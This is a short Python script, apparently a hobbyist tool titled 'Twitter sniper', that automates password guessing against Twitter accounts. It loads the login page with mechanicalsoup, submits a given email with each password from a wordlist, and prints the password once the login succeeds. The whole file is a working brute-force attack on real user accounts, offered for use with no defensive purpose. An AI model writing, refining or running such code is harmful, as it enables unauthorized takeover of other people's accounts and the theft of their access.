import mechanicalsoup
from optparse import OptionParser
parse = OptionParser("""

  _______       _ _   _                        _                 
 |__   __|     (_) | | |                      (_)                
    | |_      ___| |_| |_ ___ _ __   ___ _ __  _ _ __   ___ _ __ 
    | \ \ /\ / / | __| __/ _ \ '__| / __| '_ \| | '_ \ / _ \ '__|
    | |\ V  V /| | |_| ||  __/ |    \__ \ | | | | |_) |  __/ |   
    |_| \_/\_/ |_|\__|\__\___|_|    |___/_| |_|_| .__/ \___|_|   
                                                | |              
                                                |_|
--help for help
this script was written by Abdallah Elsokary
https://www.youtube.com/user/abdallahelsokary
https://twitter.com/abdallahelsoka1
""")
parse.add_option('-e','--email',dest='email',type='string',help='the account email')
parse.add_option('-l','--list',dest='password_list',type='string',help='password list')
(options,args) = parse.parse_args()
if options.email == None or  options.password_list == None:
    print(parse.usage)
    exit(0)
else:
    try:
        print("<<<<<<++++++start attacking email+++++>>>>>")
        browser = mechanicalsoup.Browser(soup_config={"features":"html.parser"})
        login_page = browser.get("https://twitter.com/login?lang=en")
        password_list = options.password_list
        email = options.email
        open_password_list = open(password_list,'r')
        for i in open_password_list.readlines():
            i = i.rstrip("\n")
            login_form = login_page.soup.select("form")[1]
            login_form.select("input")[0]['value'] = email #username
            login_form.select("input")[1] ['value'] = i #password
            secound_page = browser.submit(login_form,login_page.url)
            print("[*]trying {0}".format(i))
            if secound_page.soup.select("title")[0].text != "Login on Twitter":
                print ("[+] login password is {0}".format(i))
                exit(0)
    except Exception as e:
        print(e)
    except KeyboardInterrupt:
        print("OK ! as you like")

